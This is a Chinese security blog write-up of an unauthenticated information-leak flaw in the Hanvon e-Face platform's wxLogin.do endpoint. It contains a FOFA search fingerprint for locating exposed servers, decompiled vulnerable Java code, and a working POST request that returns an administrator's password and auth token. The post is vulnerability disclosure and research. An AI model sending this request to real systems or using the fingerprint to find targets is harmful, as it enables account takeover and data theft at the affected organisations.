---
title: "汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏"
source: https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html
asset_dir: assets/汉王e脸通综合管理平台-wxlogin.do-未授权访问致敏感信息泄漏
---

# 汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/8 12:29
* 1464浏览
* [0评论](#comment)
* 47分钟阅读

深入探索

计算机安全

鉴权

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `wxLogin.do` 接口存在信息泄露漏洞，[未授权](https://mrxn.net/tag/未授权)攻击者可利用该漏洞获取系统敏感信息。

网络安全

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `wxLogin` 的实现

```
@ResponseBody
    @RequestMapping({"/wxLogin.do"})
    public MethodResult wxLogin(@RequestParam("openid") String openid, @RequestParam("username") String username, @RequestParam("password") String password, @RequestParam("flag") boolean flag, @RequestParam("id") Long id) throws Exception {
        UserTpm cUser = null;
        String newUsername = URLDecoder.decode(username, "utf-8");
        if (flag) {
            cUser = (UserTpm)this.userAsm.getUser(id).getResult();
            cUser.setOpenid(openid);
            if (cUser.getBlacklist() != null && cUser.getBlacklist() || cUser.getState() != null && cUser.getState() <= 0) {
                return MethodResult.errorResult("用户已被禁止登录");
            }
        } else {
            if (Utils.isEmpty(newUsername) || Utils.isEmpty(password)) {
                return MethodResult.errorResult("参数错误");
            }

            if (username.equalsIgnoreCase("ADMIN")) {
                return MethodResult.errorResult("超级管理员禁止登录");
            }

            UserTpm user = null;

            try {
                user = this.userAsm.getAttendServiceUser(newUsername, this.strUtil.getSHAString(this.strUtil.md5(password)));
            } catch (Exception e) {
                e.printStackTrace();
                return MethodResult.errorResult("系统系统异常");
            }

            if (user == null) {
                return MethodResult.errorResult("用户名/密码不匹配");
            }

            if (user.getBlacklist() != null && user.getBlacklist() || user.getState() != null && user.getState() <= 0) {
                return MethodResult.errorResult("用户已被禁止登录");
            }

            cUser = (UserTpm)this.userAsm.getUser(user.getId()).getResult();
            cUser.setOpenid(openid);
            this.setOpenId(cUser);
        }

        MethodResult<List<ApproverTpm>> approver = this.approverAsm.getApproverByUserId(cUser.getId());
        boolean isApprover = approver != null && approver.isSuccess() && approver.getResult() != null && ((List)approver.getResult()).size() > 0;
        boolean isAgent = false;
        if (!isApprover) {
            MethodResult<List<ProcessAgentTpm>> agent = this.agentAsm.getApproverByAgentId(cUser.getId());
            isAgent = agent != null && agent.isSuccess() && agent.getResult() != null && ((List)agent.getResult()).size() > 0;
        }

        cUser.setApprover(isApprover || isAgent);

        for(String tk : this.tokenHash.keySet()) {
            UserTpm u = (UserTpm)this.tokenHash.get(tk);
            if (u != null && u.getId().equals(cUser.getId())) {
                this.tokenHash.remove(tk);
                break;
            }
        }

        String token = cUser.getEmployId() + UUID.randomUUID().toString();

        try {
            token = this.strUtil.getSHAString(token);
        } catch (Exception var15) {
        }

        token = token.toUpperCase();

        try {
            this.wsTokenAsm.saveToken(cUser.getId(), cUser.getEmployId(), token, 1);
        } catch (Exception e) {
            e.printStackTrace();
            return MethodResult.errorResult("系统系统异常");
        }

        this.tokenHash.put(token, cUser);
        cUser.setToken(token);
        return MethodResult.successResult(cUser);
    }
```

跟进 `setOpenId` 方法

```
private MethodResult setOpenId(UserTpm user) {
        MethodResult result = null;
        UserTpm targetUser = null;

        try {
            MethodResult<UserTpm> userResult = this.weixinAsm.editUserOpenId(user);
            targetUser = (UserTpm)userResult.getResult();
            if (!userResult.isSuccess() || targetUser == null) {
                throw new Exception("添加openid失败！");
            }

            result = MethodResult.successResult("添加openid成功！");
        } catch (Exception e) {
            String msg = "登陆失败！原因：" + e.getLocalizedMessage();
            result = MethodResult.errorResult(msg);
        }

        return result;
    }
```

当flag为true时，它直接使用id获取用户，然后设置openid。但是，这里并没有验证传入的openid是否合法，也没有验证id是否属于当前用户。也就是说，只要知道一个用户的id，就可以通过设置flag=true，并传入该id和任意openid，就可以修改该用户的openid，并且获取到该用户的详细信息（包括token）。

漏洞扫描服务

# 漏洞复现

> 使用id为1的管理员来测试

```
POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
Host: hanvon.mrxn.net
Content-Type: application/x-www-form-urlencoded
```

[![汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏](images/img-001-f3dc855fefad.webp)](https://image.mrxn.net/1850826bbf024ee2ba8495ba88cf6fa8.webp)

可以获取到系统指定id（管理员）的密码以及可用于头部认证的token

物流软件安全

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#未授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 wxLogin.do 未授权访问致敏感信息泄漏](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

Windows安全工具

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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